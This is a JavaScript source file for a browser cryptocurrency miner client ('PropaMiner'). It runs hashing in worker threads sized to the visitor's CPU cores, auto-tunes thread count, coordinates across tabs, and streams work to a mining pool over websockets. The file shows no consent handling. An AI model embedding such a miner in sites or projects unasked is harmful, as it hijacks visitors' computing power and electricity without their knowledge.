import Job from './job'
import MineWorker from './mine-worker'

class Miner {
  constructor (user, options) {
    options = options || {}
    this._user = user
    this._threads = []
    this._hashes = 0
    this._currentJob = null
    this._autoReconnect = true
    this._reconnectRetry = 3
    this._totalHashesFromDeadThreads = 0
    this._throttle = Math.max(0, Math.min(.99, options.throttle || 0))
    this._autoThreads = {
      enabled: !!options.autoThreads,
      interval: null,
      adjustAt: null,
      adjustEvery: 1e4,
      stats: {}
    }
    this._tab = {
      ident: 16777215 * Math.random() | 0,
      mode: Job.IF_EXCLUSIVE_TAB,
      grace: 0,
      lastPingReceived: 0,
      interval: null
    }
    if (window.BroadcastChannel) try {
      this._bc = new BroadcastChannel('propaminer')
      this._bc.onmessage = function (response) {
        if (response.data === 'ping') {
          this._tab.lastPingReceived = Date.now()
        }
      }.bind(this)
    } catch (error) {}
    this._eventListeners = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: []
    }
    const concurrency = navigator.hardwareConcurrency || 4
    this._targetNumThreads = options.threads || concurrency
    this._onTargetMetBound = this._onTargetMet.bind(this)
  }

  start (mode) {
    this._tab.mode = mode || Job.IF_EXCLUSIVE_TAB
    if (this._tab.interval) {
      clearInterval(this._tab.interval)
      this._tab.interval = null
    }
    this._startNow()
  }

  stop (message) {
    for (let i = 0; i < this._threads.length; ++i) {
      this._totalHashesFromDeadThreads += this._threads[i].hashesTotal
      this._threads[i].stop()
    }
    this._threads = []
    this._autoReconnect = false
    this._currentJob = null
    if (this._socket) {
      this._socket.close()
    }
    if (this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval)
      this._autoThreads.interval = null
    }
    if (this._tab.interval && message !== 'dontKillTabUpdate') {
      clearInterval(this._tab.interval)
      this._tab.interval = null
    }
  }

  getHashesPerSecond () {
    let sum = 0
    for (let i = 0; i < this._threads.length; ++i)
      sum += this._threads[i].hashesPerSecond
    return sum
  }

  getTotalHashes () {
    let currentTimestamp = Date.now(),
        sum = this._totalHashesFromDeadThreads
    for (let i = 0; i < this._threads.length; ++i) {
      let thread = this._threads[i]
      sum += thread.hashesTotal
    }
    return 0 | sum
  }

  getAcceptedHashes () {
    return this._hashes
  }

  on (event, callback) {
    if (this._eventListeners[event]) {
      this._eventListeners[event].push(callback)
    }
  }

  getAutoThreadsEnabled () {
    return this._autoThreads.enabled
  }

  setAutoThreadsEnabled (enabled) {
    this._autoThreads.enabled = !!enabled
    if (!enabled && this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval)
      this._autoThreads.interval = null
    } else if (enabled && !this._autoThreads.interval) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery
      this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
    }
  }

  getThrottle () {
    return this._throttle
  }

  setThrottle (throttle) {
    this._throttle = Math.max(0, Math.min(.99, throttle))
    if (this._currentJob) {
      this._setJob(this._currentJob)
    }
  }

  getNumThreads () {
    return this._threads.length
  }

  setNumThreads (numThreads) {
    numThreads = Math.max(1, 0 | numThreads)
    if ((this._targetNumThreads = numThreads) > this._threads.length) {
      while (numThreads > this._threads.length) {
        let t = new MineWorker
        if (this._currentJob) {
          t.setJob(this._currentJob, this._onTargetMetBound)
        }
        this._threads.push(t)
      }
    } else if (numThreads < this._threads.length) {
      while (numThreads < this._threads.length) {
        let t = this._threads.pop()
        this._totalHashesFromDeadThreads += t.hashesTotal
        t.stop()
      }
    }
  }

  isRunning () {
    // return 0 < this._threads.length
    if (!this._socket) {
      return false
    }
    if (this._socket.readyState == WebSocket.CLOSED || this._socket.readyState == WebSocket.CLOSING) {
      return false
    }
    return true
  }

  _startNow () {
    if (this._tab.mode !== Job.FORCE_MULTI_TAB && !this._tab.interval) {
      this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
    }
    if (this._tab.mode !== Job.IF_EXCLUSIVE_TAB || !this._otherTabRunning()) {
      if (this._tab.mode === Job.FORCE_EXCLUSIVE_TAB) {
        this._tab.grace = Date.now() + 3e3
      }
      this.setNumThreads(this._targetNumThreads)
      this._autoReconnect = true
      this._connect()
    }
  }

  _otherTabRunning () {
    if (this._tab.lastPingReceived > Date.now() - 1500) {
      return true
    }
    try {
      let currentMiner = localStorage.getItem('propaminer')
      if (currentMiner) {
        const t = JSON.parse(currentMiner)
        if (t.ident !== this._tab.ident && Date.now() - t.time < 1500) {
          return true
        }
      }
    } catch (error) {}
    return false
  }

  _updateTabs () {
    const flag = this._otherTabRunning()
    if (flag && this.isRunning() && Date.now() > this._tab.grace) {
      this.stop('dontKillTabUpdate')
    } else if (!flag && !this.isRunning()) {
      this._startNow()
    }
    if (this.isRunning()) {
      if (this._bc) {
        this._bc.postMessage('ping')
      }
      try {
        localStorage.setItem('propaminer', JSON.stringify({
          ident: this._tab.ident,
          time: Date.now()
        }))
      } catch (error) {}
    }
  }

  _adjustThreads () {
    const hashPerSecond = this.getHashesPerSecond(), numThreads = this.getNumThreads()
    let	  threadStats = this._autoThreads.stats
    threadStats[numThreads] = threadStats[numThreads] ? .5 * threadStats[numThreads] + .5 * hashPerSecond : hashPerSecond
    if (Date.now() > this._autoThreads.adjustAt) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery
      const cur = (threadStats[numThreads] || 0) - 1,
            next = threadStats[numThreads + 1] || 0,
            prev = threadStats[numThreads - 1] || 0
      if (prev < cur && (0 === next || cur < next) && numThreads < 16) return this.setNumThreads(numThreads + 1)
      if (next < cur && (!prev || cur < prev) && 1 < numThreads) return this.setNumThreads(numThreads - 1)
    }
  }

  _emit (event, params) {
    const listeners = this._eventListeners[event]
    if (listeners && listeners.length) {
      for (let i = 0; i < listeners.length; ++i) {
        listeners[i](params)
      }
    }
  }

  // djb2 hash
  // http://www.cse.yorku.ca/~oz/hash.html
  _hashString (str) {
    let hash = 5381, l = str.length
    while (l) {
      hash = 33 * hash ^ str.charCodeAt(--l)
    }
    return hash >>> 0
  }

  _connect () {
    if (!this._socket) {
      const shards = Job.CONFIG.WEBSOCKET_SHARDS
      let   index = Math.floor(Math.random() * shards.length)
      const shard = shards[index]
      const url = shard[Math.random() * shard.length | 0]
      this._socket = new WebSocket(url)
      this._socket.onmessage = this._onMessage.bind(this)
      this._socket.onerror = this._onError.bind(this)
      this._socket.onclose = this._onClose.bind(this)
      this._socket.onopen = this._onOpen.bind(this)
    }
  }

  _onOpen () {
    this._emit('open')
    // let data = {
    //   type: this._user ? 'user' : 'anonymous',
    //   user: this._user ? this._user.toString() : null
    // }
    // this._send('auth', data)
  }

  _onClose (response) {
    // https://github.com/Luka967/websocket-close-codes
    if (response.code >= 1003 && response.code <= 1009) {
      this._reconnectRetry = 60
    }
    for (let i = 0; i < this._threads.length; ++i) {
      this._threads[i].stop()
    }
    this._threads = []
    this._socket = null
    this._emit('close')
    if (this._autoReconnect) {
      setTimeout(this._startNow.bind(this), 1e3 * this._reconnectRetry)
    }
  }

  _onMessage (response) {
    const data = JSON.parse(response.data)
    switch(data.type) {
      case 'job':
        this._setJob(data.params)
        this._emit('job', data.params)
        if (this._autoThreads.enabled && !this._autoThreads.interval) {
          this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery
          this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
        }
        break
      case 'hash_accepted':
        this._hashes = data.params.hashes
        this._emit('accepted', data.params)
        break
      case 'authed':
        this._hashes = data.params.hashes || 0
        this._emit('authed', data.params)
        this._reconnectRetry = 3
        break
      case 'error':
        if (console && console.error) {
          console.error('PropaMiner Error:', data.params.error)
        }
        this._emit('error', data.params)
      break
      case 'banned':
        this._emit('error', {
          banned: true
        })
        this._reconnectRetry = 600
      break
      default:
        break
    }
  }

  _onError (response) {
    this._emit('error', {
      error: 'connection_error'
    })
    this._onClose(response)
  }

  _onTargetMet (job) {
    this._emit('found', job)
    if (job.job_id === this._currentJob.job_id) {
      this._send('submit', {
        job_id: job.job_id,
        nonce: job.nonce,
        result: job.result
      })
    }
  }

  _send (type, params) {
    if (this._socket) {
      const data = {
        type: type,
        params: params || {}
      }
      this._socket.send(JSON.stringify(data))
    }
  }

  _setJob (job) {
    this._currentJob = job
    this._currentJob.throttle = this._throttle
    for (let i = 0; i < this._threads.length; ++i) {
      this._threads[i].setJob(job, this._onTargetMetBound)
    }
  }
}

export {
  Miner as default
}
